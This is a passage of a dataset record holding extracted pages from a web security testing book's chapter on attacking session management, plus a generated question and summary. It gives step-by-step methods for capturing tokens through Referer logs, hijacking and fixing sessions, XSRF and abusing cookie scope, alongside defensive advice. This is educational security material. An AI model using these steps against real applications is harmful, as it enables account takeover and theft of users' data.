tokens are generally transmit-\nted in a more secure manner but that developers have used the URL in\nspecific cases to work around particular difficulties. For example, this\nbehavior is often observed where a web application interfaces with an\nexternal system.\n3. If session tokens are being transmitted in URLs, attempt to find any appli-\ncation functionality that enables you to inject arbitrary off-site links into\npages viewed by other users. Examples include functionality implement-\ning a message board, site feedback, question-and-answer, and so on. If\nso, submit links to a web server you control and wait to see whether any\nusers’ session tokens are received in your Referer logs.\n4. If any session tokens are captured, attempt to hijack user sessions by\nusing the application as normal but substituting a captured token for your\nown. You can do this by intercepting the next response from the server\nand adding a Set-Cookie header of your own with the captured cookie\nvalue. In Burp, you can apply a single Suite-wide configuration that sets\na specific cookie in all requests to the target application to allow easy\nswitching between different session contexts during testing.\n6. If a large number of tokens are captured, and session hijacking allows you\nto access sensitive data such as personal details, payment information,\nor user passwords, you can use the automated techniques described in\nChapter 14 to harvest all desired data belonging to other application users.\ncc0077..iinndddd 223399 88//1199//22001111 1122::0077::4433 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 240\n240 Chapter 7 n Attacking Session Management\nTRY IT!\nhttp://mdsec.net/auth/379/\nVulnerable Mapping of Tokens to Sessions\nVarious common vulnerabilities in session management mechanisms arise\nbecause of weaknesses in how the application maps the creation and processing\nof session tokens to individual users’ sessions themselves.\nThe simplest weakness is to allow multiple valid tokens to be concurrently\nassigned to the same user account. In virtually every application, there is no\nlegitimate reason why any user should have more than one session active at\none time. Of course, it is fairly common for a user to abandon an active session\nand start a new one — for example, because he closes a browser window or\nmoves to a different computer. But if a user appears to be using two different\nsessions simultaneously, this usually indicates that a security compromise has\noccurred: either the user has disclosed his credentials to another party, or an\nattacker has obtained his credentials through some other means. In both cases,\npermitting concurrent sessions is undesirable, because it allows users to persist\nin undesirable practices without inconvenience and because it allows an attacker\nto use captured credentials without risk of detection.\nA related but distinct weakness is for applications to use “static” tokens.\nThese look like session tokens and may initially appear to function like them,\nbut in fact they are no such thing. In these applications, each user is assigned\na token, and this same token is reissued to the user every time he logs in. The\napplication always accepts the token as valid regardless of whether the user\nhas recently logged in and been issued with it. Applications like this really\ninvolve a misunderstanding about the whole concept of what a session is, and\nthe benefi ts it provides for managing and controlling access to the application.\nSometimes, applications operate like this as a means of implementing poorly\ndesigned “remember me” functionality, and the static token is accordingly\nstored in a persistent cookie (see Chapter 6). Sometimes the tokens themselves\nare vulnerable to prediction attacks, making the vulnerability far more serious.\nRather than compromising the sessions of currently logged-in users, a successful\nattack compromises, for all time, the accounts of all registered users.\nOther kinds of strange application behavior are also occasionally observed\nthat demonstrate a fundamental defect in the relationship between tokens and\nsessions. One example is where a meaningful token is constructed based on a\nusername and a random component. For example, consider the token:\ndXNlcj1kYWY7cjE9MTMwOTQxODEyMTM0NTkwMTI=\nwhich Base64-decodes to:\nuser=daf;r1=13094181213459012\ncc0077..iinndddd 224400 88//1199//22001111 1122::0077::4433 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 241\nChapter 7 n Attacking Session Management 241\nAfter extensive analysis of the r1 component, we may conclude that this cannot\nbe predicted based on a sample of values. However, if the application’s session\nprocessing logic is awry, it may be that an attacker simply needs to submit any\nvalid value as r1 and any valid value as user to access a session under the security\ncontext of the specifi ed user. This is essentially an access control vulnerability,\nbecause decisions about access are being made on the basis of user-supplied\ndata outside of the session (see Chapter 8). It arises because the application\neffectively uses session tokens to signify that the requester has established some\nkind of valid session with the application. However, the user context in which\nthat session is processed is not an integral property of the session itself but is\ndetermined per-request through some other means. In this case, that means\ncan be directly controlled by the requester.\n\nHACK STEPS\n1. Log in to the application twice using the same user account, either from\ndifferent browser processes or from different computers. Determine\nwhether both sessions remain active concurrently. If so, the application\nsupports concurrent sessions, enabling an attacker who has compromised\nanother user’s credentials to make use of these without risk of detection.\n2. Log in and log out several times using the same user account, either\nfrom different browser processes or from different computers. Determine\nwhether a new session token is issued each time or whether the same\ntoken is issued each time you log in. If the latter occurs, the application is\nnot really employing proper sessions.\n3. If tokens appear to contain any structure and meaning, attempt to sepa-\nrate out components that may identify the user from those that appear to\nbe inscrutable. Try to modify any user-related components of the token so\nthat they refer to other known users of the application, and verify whether\nthe resulting token is accepted by the application and enables you to\nmasquerade as that user.\nTRY IT!\nhttp://mdsec.net/auth/382/\nhttp://mdsec.net/auth/385/\nVulnerable Session Termination\nProper termination of sessions is important for two reasons. First, keeping the\nlife span of a session as short as is necessary reduces the window of opportunity\nwithin which an attacker may capture, guess, or misuse a valid session token.\ncc0077..iinndddd 224411 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 242\n242 Chapter 7 n Attacking Session Management\nSecond, it provides users with a means of invalidating an existing session when\nthey no longer require it. This enables them to reduce this window further and\nto take some responsibility for securing their session in a shared computing\nenvironment. The main weaknesses in session termination functions involve\nfailures to meet these two key objectives.\nSome applications do not enforce effective session expiration. Once created, a\nsession may remain valid for many days after the last request is received, before\nthe server eventually expires the session. If tokens are vulnerable to some kind\nof sequencing fl aw that is particularly diffi cult to exploit (for example, 100,000\nguesses for each valid token identifi ed), an attacker may still be able to capture\nthe tokens of every user who has accessed the application in the recent past.\nSome applications do not provide effective logout functionality:\nn In some cases, a logout function is simply not implemented. Users have\nno means of causing the application to invalidate their session.\nn In some cases, the logout function does not actually cause the server\nto invalidate the session. The server removes the token from the user’s\nbrowser (for example, by issuing a Set-Cookie instruction to blank the\ntoken). However, if the user continues to submit the token, the server\nstill accepts it.\nn In the worst cases, when a user clicks Logout, this fact is not communi-\ncated to the server, so the server performs no action. Rather, a client-side\nscript is executed that blanks the user’s cookie, meaning that subsequent\nrequests return the user to the login page. An attacker who gains access\nto this cookie could use the session as if the user had never logged out.\nSome applications that do not use authentication still contain functionality\nthat enables users to build up sensitive data within their session (for example,\na shopping application). Yet typically they do not provide any equivalent of a\nlogout function for users to terminate their session.\n\nHACK STEPS\n1. Do not fall into the trap of examining actions that the application per-\nforms on the client-side token (such as cookie invalidation via a new\nSet-Cookie instruction, client-side script, or an expiration time attribute).\nIn terms of session termination, nothing much depends on what happens\nto the token within the client browser. Rather, investigate whether session\nexpiration is implemented on the server side:\na. Log in to the application to obtain a valid session token.\nb. Wait for a period without using this token, and then submit a request\nfor a protected page (such as “my details”) using the token.\ncc0077..iinndddd 224422 88//1199//22001111 1122::0077::4444 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 243\nChapter 7 n Attacking Session Management 243\nc. If the page is displayed as normal, the token is still active.\nd. Use trial and error to determine how long any session expiration time-\nout is, or whether a token can still be used days after the last request\nusing it. Burp Intruder can be configured to increment the time inter-\nval between successive requests to automate this task.\n2. Determine whether a logout function exists and is prominently made\navailable to users. If not, users are more vulnerable, because they have no\nway to cause the application to invalidate their session.\n3. Where a logout function is provided, test its effectiveness. After logging out,\nattempt to reuse the old token and determine whether it is still valid. If so,\nusers remain vulnerable to some session hijacking attacks even after they\nhave “logged out.” You can use Burp Suite to test this, by selecting a recent\nsession-dependent request from the proxy history and sending it to Burp\nRepeater to reissue after you have logged out from the application.\nTRY IT!\nhttp://mdsec.net/auth/423/\nhttp://mdsec.net/auth/439/\nhttp://mdsec.net/auth/447/\nhttp://mdsec.net/auth/452/\nhttp://mdsec.net/auth/457/\nClient Exposure to Token Hijacking\nAn attacker can target other users of the application in an attempt to capture\nor misuse the victim’s session token in various ways:\nn An obvious payload for cross-site scripting attacks is to query the user’s\ncookies to obtain her session token, which can then be transmitted to an\narbitrary server controlled by the attacker. All the various permutations\nof this attack are described in detail in Chapter 12.\nn Various other attacks against users can be used to hijack the user’s session\nin different ways. With session fi xation vulnerabilities, an attacker feeds\na known session token to a user, waits for her to log in, and then hijacks\nher session. With cross-site request forgery attacks, an attacker makes\na crafted request to an application from a web site he controls, and he\nexploits the fact that the user’s browser automatically submits her current\ncookie with this request. These attacks are also described in Chapter 12.\ncc0077..iinndddd 224433 88//1199//22001111 1122::0077::4444 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 244\n244 Chapter 7 n Attacking Session Management\n\nHACK STEPS\n1. Identify any cross-site scripting vulnerabilities within the application, and\ndetermine whether these can be exploited to capture the session tokens\nof other users (see Chapter 12).\n2. If the application issues session tokens to unauthenticated users, obtain a\ntoken and perform a login. If the application does not issue a fresh token\nfollowing a successful login, it is vulnerable to session fixation.\n3. Even if the application does not issue session tokens to unauthenticated\nusers, obtain a token by logging in, and then return to the login page. If\nthe application is willing to return this page even though you are already\nauthenticated, submit another login as a different user using the same\ntoken. If the application does not issue a fresh token after the second\nlogin, it is vulnerable to session fixation.\n4. Identify the format of session tokens used by the application. Modify your\ntoken to an invented value that is validly formed, and attempt to log in.\nIf the application allows you to create an authenticated session using an\ninvented token, it is vulnerable to session fixation.\n5. If the application does not support login, but processes sensitive user\ninformation (such as personal and payment details), and allows this to be\ndisplayed after submission (such as on a “verify my order” page), carry\nout the previous three tests in relation to the pages displaying sensitive\ndata. If a token set during anonymous usage of the application can later\nbe used to retrieve sensitive user information, the application is vulner-\nable to session fixation.\n6. If the application uses HTTP cookies to transmit session tokens, it may\nwell be vulnerable to cross-site request forgery (XSRF). First, log in to the\napplication. Then confirm that a request made to the application but origi-\nnating from a page of a different application results in submission of the\nuser’s token. (This submission needs to be made from a window of the\nsame browser process that was used to log in to the target application.)\nAttempt to identify any sensitive application functions whose parameters\nan attacker can determine in advance, and exploit this to carry out unau-\nthorized actions within the security context of a target user. See Chapter\n13 for more details on how to execute XSRF attacks.\nLiberal Cookie Scope\nThe usual simple summary of how cookies work is that the server issues a cookie\nusing the HTTP response header Set-cookie, and the browser then resubmits\nthis cookie in subsequent requests to the same server using the Cookie header.\nIn fact, matters are rather more subtle than this.\ncc0077..iinndddd 224444 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 245\nChapter 7 n Attacking Session Management 245\nThe cookie mechanism allows a server to specify both the domain and the\nURL path to which each cookie will be resubmitted. To do this, it uses the domain\nand path attributes that may be included in the Set-cookie instruction.\nCookie Domain Restrictions\nWhen the application residing at foo.wahh-app.com sets a cookie, the browser\nby default resubmits the cookie in all subsequent requests to foo.wahh-app\n.com, and also to any subdomains, such as admin.foo.wahh-app.com. It does\nnot submit the cookie to any other domains, including the parent domain\nwahh-app.com and any other subdomains of the parent, such as bar.wahh-app.com.\nA server can override this default behavior by including a domain attribute\nin the Set-cookie instruction. For example, suppose that the application at foo\n.wahh-app.com returns the following HTTP header:\nSet-cookie: sessionId=19284710; domain=wahh-app.com;\nThe browser then resubmits this cookie to all subdomains of wahh-app.com,\nincluding bar.wahh-app.com.\nNOTE A server cannot specify just any domain using this attribute. First, the\ndomain specifi ed must be either the same domain that the application is run-\nning on or a domain that is its parent (either immediately or at some remove).\nSecond, the domain specifi ed cannot be a top-level domain such as .com or\n.co.uk, because this would enable a malicious server to set arbitrary cook-\nies on any other domain. If the server violates one of these rules, the browser\nsimply ignores the Set-cookie instruction.\nIf an application sets a cookie’s domain scope as unduly liberal, this may\nexpose the application to various security vulnerabilities.\nFor example, consider a blogging application that allows users to register,\nlog in, write blog posts, and read other people’s blogs. The main application is\nlocated at the domain wahh-blogs.com. When users log in to the application,\nthey receive a session token in a cookie that is scoped to this domain. Each user\ncan create blogs that are accessed via a new subdomain that is prefi xed by his\nusername:\nherman.wahh-blogs.com\nsolero.wahh-blogs.com\nBecause cookies are automatically resubmitted to every subdomain within\ntheir scope, when a user who is logged in browses the blogs of other users,\nhis session token is submitted with his requests. If blog authors are permitted\nto place arbitrary JavaScript within their own blogs (as is usually the case in\ncc0077..iinndddd 224455 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 246\n246 Chapter 7 n Attacking Session Management\nreal-world blog applications), a malicious blogger can steal the session tokens\nof other users in the same way as is done in a stored cross-site scripting attack\n(see Chapter 12).\nThe problem arises because user-authored blogs are created as subdomains\nof the main application that handles authentication and session management.\nThere is no facility within HTTP cookies for the application to prevent cookies\nissued by the main domain from being resubmitted to its subdomains.\nThe solution is to use a different domain name for the main application (for\nexample, www.wahh-blogs.com) and to scope the domain of its session token\ncookies to this fully qualifi ed name. The session cookie will not then be submit-\nted when a logged-in user browses the blogs of other users.\nA different version of this vulnerability arises when an application explicitly\nsets the domain scope of its cookies to a parent domain. For example, sup-\npose that a security-critical application is located at the domain sensitiveapp\n.wahh-organization.com. When it sets cookies, it explicitly liberalizes their\ndomain scope, as follows:\nSet-cookie: sessionId=12df098ad809a5219; domain=wahh-organization.com\nThe consequence of this is that the sensitive application’s session token cookies\nwill be submitted when a user visits every subdomain used by wahh-organization\n.com, including:\nwww.wahh-organization.com\ntestapp.wahh-organization.com\nAlthough these other applications may all belong to the same organization as\nthe sensitive application, it is undesirable for the sensitive application’s cookies\nto be submitted to other applications, for several reasons:\nn The personnel responsible for the other applications may have a different\nlevel of trust than those responsible for the sensitive application.\nn The other applications may contain functionality that enables third par-\nties to obtain the value of cookies submitted to the application, as in the\nprevious blogging example.\nn The other applications may not have been subjected to the same security\nstandards or testing as the sensitive application (because they are less\nimportant, do not handle sensitive data, or have been created only for test\npurposes). Many kinds of vulnerability that may exist in those applica-\ntions (for example, cross-site scripting vulnerabilities) may be irrelevant\nto the security posture of those applications. But they could enable an\nexternal attacker to leverage an insecure application to capture session\ntokens created by the sensitive application.\ncc0077..iinndddd 224466 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 247\nChapter 7 n Attacking Session Management 247\nNOTE Domain-based segregation of cookies is not as strict as the same-\norigin policy in general (see Chapter 3). In addition to the issues already\ndescribed in the handling of hostnames, browsers ignore both the protocol\nand port number when determining cookie scope. If an application shares a\nhostname with an untrusted application and relies on a difference in protocol\nor port number to segregate itself, the more relaxed handling of cookies may\nundermine this segregation. Any cookies issued by the application will be\naccessible by the untrusted application that shares its hostname.\n\nHACK STEPS\nReview all the cookies issued by the application, and check for any domain\nattributes used to control the scope of the cookies.\n1. If an application explicitly liberalizes its cookies’ scope to a parent\ndomain, it may be leaving itself vulnerable to attacks via other web\napplications.\n2. If an application sets its cookies’ domain scope to its own domain name\n(or does not specify a domain attribute), it may still be exposed to appli-\ncations or functionality accessible via subdomains.\nIdentify all the possible domain names that will receive the cookies issued\nby the application. Establish whether any other web application or functional-\nity is accessible via these domain names that you may be able to leverage to\nobtain the cookies issued to users of the target application.\nCookie Path Restrictions\nWhen the application residing at /apps/secure/foo-app/index.jsp sets a\ncookie, the browser by default resubmits the cookie in all subsequent requests\nto the path /apps/secure/foo-app/ and also to any subdirectories. It does not\nsubmit the cookie to the parent directory or to any other directory paths that\nexist on the server.\nAs with domain-based restrictions on cookie scope, a server can override this\ndefault behavior by including a path attribute in the Set-cookie instruction.\nFor example, if the application returns the following HTTP header:\nSet-cookie: sessionId=187ab023e09c00a881a; path=/apps/;\nthe browser resubmits this cookie to all subdirectories of the /apps/ path.\nIn contrast to domain-based scoping of cookies, this path-based restriction is\nmuch stricter than what is imposed by the same-origin policy. As such, it is almost\nentirely ineffective if used as a security mechanism to defend against untrusted\ncc0077..iinndddd 224477 88//1199//22001111 1122::0077::4444 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 248\n248 Chapter 7 n Attacking Session Management\napplications hosted on the same domain. Client-side code running at one path\ncan open a window or iframe targeting a different path on the same domain and\ncan read from and write to that window without any restrictions. Hence, obtain-\ning a cookie that is scoped to a different path on the same domain is relatively\nstraightforward. See the following paper by Amit Klein for more details:\nhttp://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/\n2006-March/000843.html\nSecuring Session Management\nThe defensive measures that web applications must take to prevent attacks on\ntheir session management mechanisms correspond to the two broad categories\nof vulnerability that affect those mechanisms. To perform session management\nin a secure manner, an application must generate its tokens in a robust way and\nmust protect these tokens throughout their life cycle from creation to disposal.\nGenerate Strong Tokens\nThe tokens used to reidentify a user between successive requests should be\ngenerated in a manner that does not provide any scope for an attacker who\nobtains a large sample of tokens from the application in the usual way to predict\nor extrapolate the tokens issued to other users.\nThe most effective token generation mechanisms are those that:\nn Use an extremely large set of possible values\nn Contain a strong source of pseudorandomness, ensuring an even and\nunpredictable spread of tokens across the range of possible values\nIn principle, any item of arbitrary length and complexity may be guessed\nusing brute force given suffi cient time and resources. The objective of designing\na mechanism to generate strong tokens is that it should be extremely unlikely\nthat a determined attacker with large amounts of bandwidth and processing\nresources should be successful in guessing a single valid token within the life\nspan of its validity.\nTokens should consist of nothing more than an identifi er used by the server\nto locate the relevant session object to be used to process the user’s request.\nThe token should contain no meaning or structure, either overtly or wrapped\nin layers of encoding or obfuscation. All data about the session’s owner and\nstatus should be stored on the server in the session object to which the session\ntoken corresponds.\nBe careful when selecting a source of randomness. Developers should be\naware that the various sources available to them are likely to differ in strength\ncc0077..iinndddd 224488 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 249\nChapter 7 n Attacking Session Management 249\nsignifi cantly. Some, like java.util.Random, are perfectly useful for many pur-\nposes where a source of changing input is required. But they can be extrapolated\nin both forward and reverse directions with perfect certainty on the basis of a\nsingle item of output. Developers should investigate the mathematical proper-\nties of the actual algorithms used within different available sources of random-\nness and should read relevant documentation about the recommended uses of\ndifferent APIs. In general, if an algorithm is not explicitly described as being\ncryptographically secure, it should be assumed to be predictable.\nNOTE Some high-strength sources of randomness take some time to return\nthe next value in their output sequence because of the steps they take to\nobtain suffi cient entropy (such as from system events). Therefore, they may\nnot deliver values fast enough to generate tokens for some high-volume\napplications.\nIn addition to selecting the most robust source of randomness that is feasible,\na good practice is to introduce as a source of entropy some information about\nthe individual request for which the token is being generated. This informa-\ntion may not be unique to that request, but it can be effective at mitigating any\nweaknesses in the core pseudorandom number generator being used. Here are\nsome examples of information that may be incorporated:\nn The source IP address and port number from which the request was received\nn TheUser-Agent header in the request\nn The time of the request in milliseconds\nA highly effective formula for incorporating this entropy is to construct a\nstring that concatenates a pseudorandom number, a variety of request-specifi c\ndata as listed, and a secret string known only to the server and generated afresh\non each reboot. A suitable hash is then taken of this string (using, for example,\nSHA-256 at the time of this writing) to produce a manageable fi xed-length string\nthat can be used as a token. (Placing the most variable items toward the start of\nthe hash’s input maximizes the “avalanche” effect within the hashing algorithm.)\nTIP Having chosen an algorithm for generating session tokens, a useful\n“thought experiment” is to imagine that your source of pseudorandomness\nis broken and always returns the same value. In this eventuality, would an\nattacker who obtains a large sample of tokens from the application be able to\nextrapolate tokens issued to other users? Using the formula described here, in\ngeneral this is highly unlikely, even with full knowledge of the algorithm used.\nThe source IP, port number, User-Agent header, and time of request together\ngenerate a vast amount of entropy. And even with full knowledge of these, the\nattacker will be unable to produce the corresponding token without knowing\nthe secret string used by the server.\ncc0077..iinndddd 224499 88//1199//22001111 1122::0077::4444 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 250\n250 Chapter 7 n Attacking Session Management\nProtect Tokens Throughout Their Life Cycle\nNow that you’ve created a robust token whose value cannot be predicted, this\ntoken needs to be protected throughout its life cycle from creation to disposal, to\nensure that it is not disclosed to anyone other than the user to whom it is issued:\nn The token should only be transmitted over HTTPS. Any token transmit-\nted in cleartext should be regarded as tainted — that is, as not providing\nassurance of the user’s identity. If HTTP cookies are being used to transmit\ntokens, these should be fl agged as secure to prevent the user’s browser\nfrom ever transmitting them over HTTP. If feasible, HTTPS should be used\nfor every page of the application, including static content such as help\npages, images, and so on. If this is not desired and an HTTP service is still\nimplemented, the application should redirect any requests for sensitive\ncontent (including the login page) to the HTTPS service. Static resources\nsuch as help pages usually are not sensitive and may be accessed without\nany authenticated session. Hence, the use of secure cookies can be backed\nup using cookie scope instructions to prevent tokens from being submit-\nted in requests for these resources.\nn Session tokens should never be transmitted in the URL, because this pro-\nvides a simple vehicle for session fi xation attacks and results in tokens\nappearing in numerous logging mechanisms. In some cases, developers\nuse this technique to implement sessions in browsers that have cookies\ndisabled. However, a better means of achieving this is to use POST requests\nfor all navigation and store tokens in a hidden fi eld of an HTML form.\nn Logout functionality should be implemented. This should dispose of all\nsession resources held on the server and invalidate the session token.\nn Session expiration should be implemented after a suitable period of inac-\ntivity (such as 10 minutes). This should result in the same behavior as if\nthe user had explicitly logged out.\nn Concurrent logins should be prevented. Each time a user logs in, a differ-\nent session token should be issued, and any existing session belonging to\nthe user should be disposed of as if she had logged out from it. When this\noccurs, the old token may be stored for a period of time. Any subsequent\nrequests received using the token should return a security alert to the\nuser stating that the session has been terminated because she logged in\nfrom a different location.\nn If the application contains any administrative or diagnostic functional-\nity that enables session tokens to be viewed, this functionality should be\nrobustly defended against unauthorized access. In most cases, there is no\nneed for this functionality to display the actual session token. Rather, it\nshould contain suffi cient details about the owner of the session for any\ncc0077..iinndddd 225500 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 251\nChapter 7 n Attacking Session Management 251\nsupport and diagnostic tasks to be performed, without divulging the ses-\nsion token being submitted by the user to identify her session.\nn The domain and path scope of an application’s session cookies should be\nset as restrictively as possible. Cookies with overly liberal scope are often\ngenerated by poorly confi gured web application platforms or web serv-\ners, rather than by the application developers themselves. No other web\napplications or untrusted functionality should be accessible via domain\nnames or URL paths that are included within the scope of the application’s\ncookies. Particular attention should be paid to any existing subdomains\nto the domain name that is used to access the application. In some cases,\nto ensure that this vulnerability does not arise, it may be necessary to\nmodify the domain- and path-naming scheme employed by the various\napplications in use within the organization.\nSpecifi c measures should be taken to defend the session management mecha-\nnism against the variety of attacks that the application’s users may fi nd them-\nselves targets of:\nn The application’s codebase should be rigorously audited to identify and\nremove any cross-site scripting vulnerabilities (see Chapter 12). Most such\nvulnerabilities can be exploited to attack session management mechanisms.\nIn particular, stored (or second-order) XSS attacks can usually be exploited\nto defeat every conceivable defense against session misuse and hijacking.\nn Arbitrary tokens submitted by users the server does not recognize should\nnot be accepted. The token should be immediately canceled within the\nbrowser, and the user should be returned to the application’s start page.\nn Cross-site request forgery and other session attacks can be made more dif-\nfi cult by requiring two-step confi rmation and/or reauthentication before\ncritical actions such as funds transfers are carried out.\nn Cross-site request forgery attacks can be defended against by not rely-\ning solely on HTTP cookies to transmit session tokens. Using the cookie\nmechanism introduces the vulnerability because cookies are automati-\ncally submitted by the browser regardless of what caused the request to\ntake place. If tokens are always transmitted in a hidden fi eld of an HTML\nform, an attacker cannot create a form whose submission will cause an\nunauthorized action unless he already knows the token’s value. In this\ncase he can simply perform an easy hijacking attack. Per-page tokens can\nalso help prevent these attacks (see the following section).\nn A fresh session should always be created after successful authentication, to\nmitigate the effects of session fi xation attacks. Where an application does\nnot use authentication but does allow sensitive data to be submitted, the\nthreat posed by fi xation attacks is harder to address. One possible approach\ncc0077..iinndddd 225511 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 252\n252 Chapter 7 n Attacking Session Management\nis to keep the sequence of pages where sensitive data is submitted as short\nas possible. Then you can create a new session at the fi rst page of this\nsequence (where necessary, copying from the existing session any required\ndata, such as the contents of a shopping cart). Or you could use per-page\ntokens (described in the following section) to prevent an attacker who\nknows the token used in the fi rst page from accessing subsequent pages.\nExcept where strictly necessary, personal data should not be displayed\nback to the user. Even where this is required (such as a “confi rm order”\npage showing addresses), sensitive items such as credit card numbers and\npasswords should never be displayed back to the user and should always\nbe masked within the source of the application’s response.\nPer-Page Tokens\nFiner-grained control over sessions can be achieved, and many kinds of session\nattacks can be made more diffi cult or impossible, by using per-page tokens in\naddition to session tokens. Here, a new page token is created every time a user\nrequests an application page (as opposed to an image, for example) and is passed\nto the client in a cookie or a hidden fi eld of an HTML form. Each time the user\nmakes a request, the page token is validated against the last value issued, in\naddition to the normal validation of the main session token. In the case of a\nnon-match, the entire session is terminated. Many of the most security-critical\nweb applications on the Internet, such as online banks, employ per-page tokens\nto provide increased protection for their session management mechanism, as\nshown in Figure 7-12.\nFigure 7-12: Per-page tokens used in a banking application\nThe use of per-page tokens does impose some restrictions on navigation (for\nexample, on use of the back and forward buttons and multiwindow browsing).\ncc0077..iinndddd 225522 88//1199//22001111 1122::0077::4444 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 253\nChapter 7 n Attacking Session Management 253\nHowever, it effectively prevents session fi xation attacks and ensures that the\nsimultaneous use of a hijacked session by a legitimate user and an attacker\nwill quickly be blocked after both have made a single request. Per-page tokens\ncan also be leveraged to track the user’s location and movement through the\napplication. They also can be used to detect attempts to access functions out of\na defi ned sequence, helping protect against certain access control defects (see\nChapter 8).\nLog, Monitor, and Alert\nThe application’s session management functionality should be closely integrated\nwith its mechanisms for logging, monitoring, and alerting to provide suitable\nrecords of anomalous activity and to enable administrators to take defensive\nactions where necessary:\nn The application should monitor requests that contain invalid tokens.\nExcept in the most predictable cases, a successful attack that attempts\nto guess the tokens issued to other users typically involves issuing large\nnumbers of requests containing invalid tokens, leaving a noticeable mark\nin the application’s logs.\nn Brute-force attacks against session tokens are diffi cult to block altogether,\nbecause no particular user account or session can be disabled to stop the\nattack. One possible action is to block source IP addresses for an amount\nof time when a number of requests containing invalid tokens have been\nreceived. However, this may be ineffective when one user’s requests origi-\nnate from multiple IP addresses (such as AOL users) or when multiple\nusers’ requests originate from the same IP address (such as users behind\na proxy or fi rewall performing network address translation).\nn Even if brute-force attacks against sessions cannot be effectively prevented\nin real time, keeping detailed logs and alerting administrators enables\nthem to investigate the attack and take appropriate action where they can.\nn Wherever possible, users should be alerted to anomalous events relating\nto their session, such as concurrent logins or apparent hijacking (detected\nusing per-page tokens). Even though a compromise may already have\noccurred, this enables the user to check whether any unauthorized actions\nsuch as funds transfers have taken place.\nReactive Session Termination\nThe session management mechanism can be leveraged as a highly effective\ndefense against many kinds of other attacks against the application. Some\nsecurity-critical applications such as online banking are extremely aggressive in\nterminating a user’s session every time he or she submits an anomalous request.\ncc0077..iinndddd 225533 88//1199//22001111 1122::0077::4455 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 254\n254 Chapter 7 n Attacking Session Management\nExamples are any request containing a modifi ed hidden HTML form fi eld or\nURL query string parameter, any request containing strings associated with\nSQL injection or cross-site scripting attacks, and any user input that normally\nwould have been blocked by client-side checks such as length restrictions.\nOf course, any actual vulnerabilities that may be exploited using such requests\nneed to be addressed at the source. But forcing users to reauthenticate every\ntime they submit an invalid request can slow down the process of probing the\napplication for vulnerabilities by many orders of magnitude, even where auto-\nmated techniques are employed. If residual vulnerabilities do still exist, they\nare far less likely to be discovered by anyone in the fi eld.\nWhere this kind of defense is implemented, it is also recommended that it\ncan be easily switched off for testing purposes. If a legitimate penetration test\nof the application is slowed down in the same way as a real-world attacker, its\neffectiveness is dramatically reduced. Also, it is very likely that the presence\nof the mechanism will result in more vulnerabilities remaining in production\ncode than if the mechanism were absent.\n\nHACK STEPS\nIf the application you are attacking uses this kind of defensive measure, you\nmay fi nd that probing the application for many kinds of common vulnerabili-\nties is extremely time-consuming. The mind-numbing need to log in after each\nfailed test and renavigate to the point of the application you were looking at\nwould quickly cause you to give up.\nIn this situation, you can often use automation to tackle the problem.\nWhen using Burp Intruder to perform an attack, you can use the Obtain\nCookie feature to perform a fresh login before sending each test case, and\nuse the new session token (provided that the login is single-stage). When\nbrowsing and probing the application manually, you can use the extensibility\nfeatures of Burp Proxy via the IBurpExtender interface. You can create an\nextension that detects when the application has performed a forced logout,\nautomatically logs back in to the application, and returns the new session\nand page to the browser, optionally with a pop-up message to tell you what\nhas occurred. Although this by no means removes the problem, in certain\ncases it can mitigate it substantially.\nSummary\nThe session management mechanism provides a rich source of potential vulner-\nabilities for you to target when formulating your attack against an application.\nBecause of its fundamental role in enabling the application to identify the same\nuser across multiple requests, a broken session management function usually\ncc0077..iinndddd 225544 88//1199//22001111 1122::0077::4455 PPMM",
    "question": "What is the key concept discussed in the text regarding session tokens and how can they be exploited or predicted?",
    "summary": "The text discusses vulnerabilities in session token generation and management, highlighting that weak or predictable tokens can be exploited by attackers. It explains how tokens can be generated using algorithms that are susceptible to prediction, especially if they include time-based components or are based on pseudorandom numbers. It also covers how encrypted tokens can be manipulated, such as through ECB or CBC ciphers, allowing attackers to alter session data. Additionally, it addresses issues like token disclosure in logs or URLs, insecure cookie scopes, and the importance of using HTTPS and proper token handling to prevent session hijacking and fixation. The text provides methods for testing and exploiting these vulnerabilities, including using tools like Burp Sequencer and Burp Intruder, and emphasizes the need for robust token generation, secure transmission, and proper session termination to mitigate risks."
  },
  {
    "start": 202,
    "end": 227,
    "text": "Stuttard c07.indd V3 - 07/22/2011 Page 255\nChapter 7 n Attacking Session Management 255\nprovides the keys to the kingdom. Jumping into other users’ sessions is good.\nHijacking an administrator’s session is even better; typically this enables you\nto compromise the entire application.\nYou can expect to encounter a wide range of defects in real-world session\nmanagement functionality. When bespoke mechanisms are employed, the\npossible weaknesses and avenues of attack may appear to be endless. The most\nimportant lesson to draw from this topic is to be patient and determined. Quite\na few session management mechanisms that appear to be robust on fi rst inspec-\ntion can be found wanting when analyzed closely. Deciphering the method an\napplication uses to generate its sequence of seemingly random tokens may take\ntime and ingenuity. But given the reward, this is usually an investment well\nworth making.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. You log in to an application, and the server sets the following cookie:\nSet-cookie: sessid=amltMjM6MTI0MToxMTk0ODcwODYz;\nAn hour later, you log in again and receive the following:\nSet-cookie: sessid=amltMjM6MTI0MToxMTk0ODc1MTMy;\nWhat can you deduce about these cookies?\n2. An application employs six-character alphanumeric session tokens and\nfi ve-character alphanumeric passwords. Both are randomly generated\naccording to an unpredictable algorithm. Which of these is likely to be\nthe more worthwhile target for a brute-force guessing attack? List all the\ndifferent factors that may be relevant to your decision.\n3. You log in to an application at the following URL:\nhttps://foo.wahh-app.com/login/home.php\nand the server sets 